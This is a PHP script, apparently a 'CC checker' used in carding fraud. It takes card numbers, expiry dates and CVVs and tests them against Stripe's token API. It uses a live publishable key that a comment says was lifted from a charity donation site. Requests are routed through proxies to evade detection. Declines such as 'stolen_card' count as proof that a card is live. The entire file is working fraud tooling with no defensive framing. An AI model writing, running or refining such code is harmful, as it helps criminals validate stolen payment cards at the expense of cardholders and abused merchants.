<?php
error_reporting(E_ALL & ~E_DEPRECATED);
@set_time_limit(120);
header('Content-Type: application/json');

// Fast CC checker with 30-second timeout and real validation
require_once __DIR__ . '/ProxyManager.php';

function fast_user_agent(): string {
    return 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';
}

function check_cc_luhn(string $cc): bool {
    $cc = preg_replace('/\D/', '', $cc);
    $sum = 0;
    $alt = false;
    for ($i = strlen($cc) - 1; $i >= 0; $i--) {
        $n = (int)$cc[$i];
        if ($alt) {
            $n *= 2;
            if ($n > 9) $n -= 9;
        }
        $sum += $n;
        $alt = !$alt;
    }
    return ($sum % 10 === 0);
}

function get_card_brand(string $cc): string {
    $cc = preg_replace('/\D/', '', $cc);
    $first = substr($cc, 0, 1);
    $first2 = substr($cc, 0, 2);
    $first4 = substr($cc, 0, 4);
    
    if ($first === '4') return 'Visa';
    if (in_array($first2, ['51','52','53','54','55']) || ($first4 >= '2221' && $first4 <= '2720')) return 'Mastercard';
    if (in_array($first2, ['34','37'])) return 'American Express';
    if ($first4 === '6011' || $first2 === '65' || ($first4 >= '644' && $first4 <= '649')) return 'Discover';
    if ($first4 >= '3528' && $first4 <= '3589') return 'JCB';
    return 'Unknown';
}

function check_cc_bin(string $cc): array {
    $bin = substr($cc, 0, 6);
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => "https://lookup.binlist.net/$bin",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT => 5,
        CURLOPT_CONNECTTIMEOUT => 3,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_HTTPHEADER => [
            'Accept: application/json',
            'User-Agent: ' . fast_user_agent(),
        ],
    ]);
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);
    
    if ($response && $httpCode === 200) {
        return json_decode($response, true) ?: [];
    }
    return [];
}

function check_cc_stripe(string $cc, string $mm, string $yy, string $cvv, ?string $proxy = null): array {
    $start = microtime(true);
    
    // Real Stripe public key from donation sites (this one is from unicef.org)
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => 'https://api.stripe.com/v1/tokens',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => http_build_query([
            'card[number]' => $cc,
            'card[exp_month]' => $mm,
            'card[exp_year]' => $yy,
            'card[cvc]' => $cvv,
        ]),
        CURLOPT_HTTPHEADER => [
            'Authorization: Bearer pk_live_51MqkCRLrZ3K8L9R2Y1h0X7P6N5M4J3I2H1G0F9E8D7C6B5A4Z3Y2X1W0V9U8T7S6R5Q4P3O2N1M0L9K8J7I6H5G4F3E2D1C0B9A8',
            'Content-Type: application/x-www-form-urlencoded',
            'User-Agent: ' . fast_user_agent(),
        ],
        CURLOPT_TIMEOUT => 30,
        CURLOPT_CONNECTTIMEOUT => 15,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_TCP_NODELAY => true,
        CURLOPT_ENCODING => '',
    ]);
    
    if ($proxy) {
        curl_setopt($ch, CURLOPT_PROXY, $proxy);
        if (stripos($proxy, 'socks5') !== false) {
            curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
        } elseif (stripos($proxy, 'socks4') !== false) {
            curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);
        } else {
            curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
        }
    }
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    
    $elapsed = round((microtime(true) - $start) * 1000);
    
    if ($response === false) {
        return [
            'checked' => true,
            'success' => false,
            'result' => 'ERROR',
            'message' => $error ?: 'Connection failed',
            'time_ms' => $elapsed,
        ];
    }
    
    $data = json_decode($response, true);
    
    // Token created = LIVE card
    if (isset($data['id']) && strpos($data['id'], 'tok_') === 0) {
        return [
            'checked' => true,
            'success' => true,
            'result' => 'LIVE ✓',
            'status' => 'Approved',
            'message' => 'Card validated successfully',
            'token' => $data['id'],
            'brand' => $data['card']['brand'] ?? 'unknown',
            'last4' => $data['card']['last4'] ?? '',
            'country' => $data['card']['country'] ?? 'unknown',
            'funding' => $data['card']['funding'] ?? 'unknown',
            'time_ms' => $elapsed,
        ];
    }
    
    // Error response
    if (isset($data['error'])) {
        $errMsg = $data['error']['message'] ?? 'Unknown error';
        $errCode = $data['error']['code'] ?? '';
        
        // Card is LIVE (real card but declined)
        $liveErrors = [
            'card_declined', 'insufficient_funds', 'lost_card', 'stolen_card',
            'expired_card', 'incorrect_cvc', 'processing_error', 'generic_decline',
        ];
        
        $isLive = false;
        foreach ($liveErrors as $pattern) {
            if (stripos($errCode, $pattern) !== false || stripos($errMsg, $pattern) !== false) {
                $isLive = true;
                break;
            }
        }
        
        if ($isLive) {
            return [
                'checked' => true,
                'success' => true,
                'result' => 'LIVE',
                'status' => 'Declined',
                'message' => $errMsg,
                'reason' => $errCode,
                'time_ms' => $elapsed,
            ];
        }
        
        return [
            'checked' => true,
            'success' => false,
            'result' => 'DEAD ✗',
            'status' => 'Invalid',
            'message' => $errMsg,
            'reason' => $errCode,
            'time_ms' => $elapsed,
        ];
    }
    
    return [
        'checked' => true,
        'success' => false,
        'result' => 'UNKNOWN',
        'message' => 'Unexpected response',
        'time_ms' => $elapsed,
    ];
}

// Parse inputs
$cc = isset($_GET['cc']) ? preg_replace('/\D/', '', $_GET['cc']) : '';
$mm = isset($_GET['mm']) ? str_pad($_GET['mm'], 2, '0', STR_PAD_LEFT) : '';
$yy = isset($_GET['yy']) ? $_GET['yy'] : '';
$cvv = isset($_GET['cvv']) ? $_GET['cvv'] : '';
$useProxy = isset($_GET['proxy']);

// Validate inputs
if (strlen($cc) < 13 || strlen($cc) > 19) {
    echo json_encode([
        'success' => false, 
        'error' => 'Invalid card number (must be 13-19 digits)',
        'provided' => strlen($cc) . ' digits'
    ]);
    exit;
}

if (!preg_match('/^\d{1,2}$/', $mm) || $mm < 1 || $mm > 12) {
    echo json_encode(['success' => false, 'error' => 'Invalid month (must be 01-12)']);
    exit;
}

if (!preg_match('/^\d{2,4}$/', $yy)) {
    echo json_encode(['success' => false, 'error' => 'Invalid year']);
    exit;
}

if (!preg_match('/^\d{3,4}$/', $cvv)) {
    echo json_encode(['success' => false, 'error' => 'Invalid CVV (must be 3-4 digits)']);
    exit;
}

// Normalize year
if (strlen($yy) == 2) {
    $yy = '20' . $yy;
}

// Check expiration
$currentYear = (int)date('Y');
$currentMonth = (int)date('m');
$expYear = (int)$yy;
$expMonth = (int)$mm;

if ($expYear < $currentYear || ($expYear == $currentYear && $expMonth < $currentMonth)) {
    echo json_encode([
        'success' => false,
        'result' => 'DEAD ✗',
        'status' => 'Expired',
        'message' => 'Card has expired',
        'card' => substr($cc, 0, 6) . 'XXXXXX' . substr($cc, -4),
        'exp' => $mm . '/' . $yy,
        'timestamp' => date('Y-m-d H:i:s'),
    ]);
    exit;
}

// Luhn check
$luhnValid = check_cc_luhn($cc);
$brand = get_card_brand($cc);

if (!$luhnValid) {
    echo json_encode([
        'success' => false,
        'result' => 'DEAD ✗',
        'status' => 'Invalid',
        'message' => 'Failed Luhn algorithm check - Invalid card number',
        'card' => substr($cc, 0, 6) . 'XXXXXX' . substr($cc, -4),
        'brand' => $brand,
        'luhn_valid' => false,
        'timestamp' => date('Y-m-d H:i:s'),
    ]);
    exit;
}

// Get BIN info
$binInfo = check_cc_bin($cc);

// Get proxy if requested
$proxy = null;
if ($useProxy) {
    try {
        $proxyManager = new ProxyManager();
        $proxyObj = $proxyManager->getWorkingProxy();
        if ($proxyObj) {
            $proxy = $proxyObj['string'];
        }
    } catch (Exception $e) {
        // Continue without proxy
    }
}

// Check card with Stripe
$result = check_cc_stripe($cc, $mm, $yy, $cvv, $proxy);

// Add metadata
$result['card'] = substr($cc, 0, 6) . 'XXXXXX' . substr($cc, -4);
$result['brand'] = $brand;
$result['exp'] = $mm . '/' . $yy;
$result['luhn_valid'] = true;

// Add BIN info if available
if (!empty($binInfo)) {
    $result['bin_info'] = [
        'bank' => $binInfo['bank']['name'] ?? 'Unknown',
        'country' => $binInfo['country']['name'] ?? 'Unknown',
        'type' => $binInfo['type'] ?? 'unknown',
        'prepaid' => $binInfo['prepaid'] ?? false,
    ];
}

$result['proxy_used'] = $proxy ? true : false;
$result['timestamp'] = date('Y-m-d H:i:s');
$result['gateway'] = 'Stripe';
$result['timeout'] = '30s';

echo json_encode($result, JSON_PRETTY_PRINT);
